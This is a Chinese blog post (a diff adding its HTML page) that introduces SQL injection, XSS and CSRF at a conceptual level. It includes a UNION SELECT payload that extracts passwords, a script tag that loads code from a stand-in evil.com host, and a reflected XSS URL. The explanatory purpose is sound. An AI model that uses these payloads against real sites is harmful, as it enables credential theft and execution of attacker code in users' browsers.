@@ -1,0 +1,508 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>常见的Web攻击方式 | Austin&#39;s blogs</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="Austin">
+    
+
+    
+    <meta name="description" content="这里主要介绍一些常见的web网站攻击的方式，以及概念，并不涉及如何防范， 关于防范后续再做记录
+1. SQL注入攻击通过在请求中加入SQL语句片段， 在后端拼接参数时候，会拼装到待执行的SQL中,来查询出更多数据如：1select username, email, desc from users where id=1;
+在用户提交请求时候，会带入参数 ?id=1,来获取相应数据。若是不发用户会在参">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见的Web攻击方式">
+<meta property="og:url" content="http://yoursite.com/2015/10/06/Web安全/index.html">
+<meta property="og:site_name" content="Austin's blogs">
+<meta property="og:description" content="这里主要介绍一些常见的web网站攻击的方式，以及概念，并不涉及如何防范， 关于防范后续再做记录
+1. SQL注入攻击通过在请求中加入SQL语句片段， 在后端拼接参数时候，会拼装到待执行的SQL中,来查询出更多数据如：1select username, email, desc from users where id=1;
+在用户提交请求时候，会带入参数 ?id=1,来获取相应数据。若是不发用户会在参">
+<meta property="og:updated_time" content="2015-10-06T13:00:48.433Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="常见的Web攻击方式">
+<meta name="twitter:description" content="这里主要介绍一些常见的web网站攻击的方式，以及概念，并不涉及如何防范， 关于防范后续再做记录
+1. SQL注入攻击通过在请求中加入SQL语句片段， 在后端拼接参数时候，会拼装到待执行的SQL中,来查询出更多数据如：1select username, email, desc from users where id=1;
+在用户提交请求时候，会带入参数 ?id=1,来获取相应数据。若是不发用户会在参">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Austin&#39;s blogs" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/Austin.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/Austin.png">
+    
+    <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Austin&#39;s blogs">Austin&#39;s blogs</a></h1>
+				<h2 class="blog-motto">Just Do it.</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+					<li>
+ 					
+						<form class="search" action="http://blog.lyways.com/search" target="_blank">
+							<label>Search</label>
+						<input name="s" type="hidden" value= null ><input type="text" name="q" size="30" placeholder="搜索"><br>
+						</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2015/10/06/Web安全/" title="常见的Web攻击方式" itemprop="url">常见的Web攻击方式</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="Austin" target="_blank" itemprop="author">Austin</a>
+		
+  <p class="article-time">
+    <time datetime="2015-10-06T09:20:46.000Z" itemprop="datePublished"> 发表于 2015-10-06</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_SQL注入攻击"><span class="toc-number">1.</span> <span class="toc-text">1. SQL注入攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-XSS跨站脚本攻击(Cross_Site_Script)"><span class="toc-number">2.</span> <span class="toc-text">2.XSS跨站脚本攻击(Cross Site Script)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS的类型"><span class="toc-number">2.1.</span> <span class="toc-text">XSS的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#浏览器的同源策略"><span class="toc-number">2.1.1.</span> <span class="toc-text">浏览器的同源策略</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-_CSRF_跨站请求伪造"><span class="toc-number">3.</span> <span class="toc-text">3. CSRF 跨站请求伪造</span></a></li></ol>
+		
+		</div>
+		
+		<p>这里主要介绍一些常见的web网站攻击的方式，以及概念，并不涉及如何防范， 关于防范后续再做记录</p>
+<h3 id="1-_SQL注入攻击">1. SQL注入攻击</h3><p>通过在请求中加入SQL语句片段， 在后端拼接参数时候，会拼装到待执行的SQL中,来查询出更多数据<br>如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> username, email, <span class="keyword">desc</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span></span><br></pre></td></tr></table></figure></p>
+<p>在用户提交请求时候，会带入参数 ?id=1,来获取相应数据。若是不发用户会在参数中添加 :<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">password</span>, 1, 1 <span class="title">from</span> <span class="title">users</span>,</span></span><br></pre></td></tr></table></figure></p>
+<p>通过以上参数将组成新的SQL语句如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> username, email, <span class="keyword">desc</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">password</span>,<span class="number">1</span>,<span class="number">1</span> <span class="keyword">from</span> <span class="keyword">users</span>;</span></span><br></pre></td></tr></table></figure></p>
+<p>通过此SQL就能查出用户的密码了</p>
+<h3 id="2-XSS跨站脚本攻击(Cross_Site_Script)">2.XSS跨站脚本攻击(Cross Site Script)</h3><p>发生在目标网站中目标用户的浏览器中，当用户浏览器渲染整个HTML文档的过程中，出现了不被预期的脚本指令并执行时， XSS就会发生。<br>一般通过注入类似下面的代码引入第三方域上的脚本资源：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://www.evil.com/xss.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>以上方式有原因如下：</p>
+<ol>
+<li>攻击代码容易控制</li>
+<li>利用script标签本身就可以嵌入第三方资源的特性，就突破了浏览器的同源策略<h4 id="XSS的类型">XSS的类型</h4></li>
+<li><p><strong>反射性XSS(非持久型XSS)</strong>: 发出请求时，XSS代码出现在URL中，作为输入提交到服务器，服务器解析后在响应内容中出现XSS代码， 最后浏览器解析执行。如：若服务器端将参数x不做任何过滤就直接输出</p>
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com?x=<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p> 那么<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>就会输出到响应体中，浏览器就会解析执行</p>
+</li>
+<li><strong>存储型XSS(持久型XSS)</strong></li>
+<li><strong>DOM XSS</strong><h5 id="浏览器的同源策略">浏览器的同源策略</h5> 同源策略： 不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源</li>
+<li><p>如何区分不同域域同域栈<br> 同域： 需要满足<strong>同协议，同域名， 同端口</strong>，才能叫做同域： 如<br> 基准域<code>http://www.test.com</code></p>
+<p> | 站点 | 是否同域| 原因<br> |——|———|—–<br> |<a href="https://www.test.com" target="_blank" rel="external">https://www.test.com</a> | 不同域 | 协议不同， http与https是不同的协议<br> |<a href="http://blog.test.com|不同域|域名不同，blog与www是不同的子域" target="_blank" rel="external">http://blog.test.com|不同域|域名不同，blog与www是不同的子域</a><br> |<a href="http://test.com" target="_blank" rel="external">http://test.com</a> |不同域|域名不同，顶级域域www子域不是一个概念<br> |<a href="http://www.test.com:8080|不同域|端口不同，8080与默认80为不同端口" target="_blank" rel="external">http://www.test.com:8080|不同域|端口不同，8080与默认80为不同端口</a><br> |<a href="http://www.test.com/blog/|同域|满足" target="_blank" rel="external">http://www.test.com/blog/|同域|满足</a></p>
+<h3 id="3-_CSRF_跨站请求伪造">3. CSRF 跨站请求伪造</h3><p> 通常在使用XSS时，需要目标站点有XSS漏洞，也就是可以执行请求中的脚本代码。若是无XSS漏洞，则无法完成攻击。而CSRF就是在不同域目标网站的站点B中，构造一个访问目标站点的请求，而诱使用户进入构造的B站点中，发起伪造的请求。<br> 起其好处是： 可以做到无脚本Javascript参与，轻松绕过不同域的跨域请求问题。</p>
+</li>
+</ol>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/Hexo-Blog/">Hexo Blog</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/Hexo/">Hexo</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://yoursite.com/2015/10/06/Web安全/" data-title="常见的Web攻击方式 | Austin&#39;s blogs" data-tsina="undefined" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2015/10/08/Mysql主从配置/" title="MySQL主从数据库配置">
+  <strong>上一篇：</strong><br/>
+  <span>
+  MySQL主从数据库配置</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2015/10/05/域名解析/"  title="域名解析">
+ <strong>下一篇：</strong><br/> 
+ <span>域名解析
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-_SQL注入攻击"><span class="toc-number">1.</span> <span class="toc-text">1. SQL注入攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-XSS跨站脚本攻击(Cross_Site_Script)"><span class="toc-number">2.</span> <span class="toc-text">2.XSS跨站脚本攻击(Cross Site Script)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS的类型"><span class="toc-number">2.1.</span> <span class="toc-text">XSS的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#浏览器的同源策略"><span class="toc-number">2.1.1.</span> <span class="toc-text">浏览器的同源策略</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-_CSRF_跨站请求伪造"><span class="toc-number">3.</span> <span class="toc-text">3. CSRF 跨站请求伪造</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/Developer/" title="Developer">Developer<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Hexo-Blog/" title="Hexo Blog">Hexo Blog<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Java编程/" title="Java编程">Java编程<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/工具/" title="工具">工具<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/数据结构/" title="数据结构">数据结构<sup>1</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/Tools/" title="Tools">Tools<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Hexo/" title="Hexo">Hexo<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ADT/" title="ADT">ADT<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MySQL/" title="MySQL">MySQL<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.oschina.net/" target="_blank" title="开源中国">开源中国</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.csdn.net/" target="_blank" title="CSDN">CSDN</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://news.dbanotes.net/" target="_blank" title="Startup News">Startup News</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> © 2015 
+		
+		<a href="/about" target="_blank" title="Austin">Austin</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
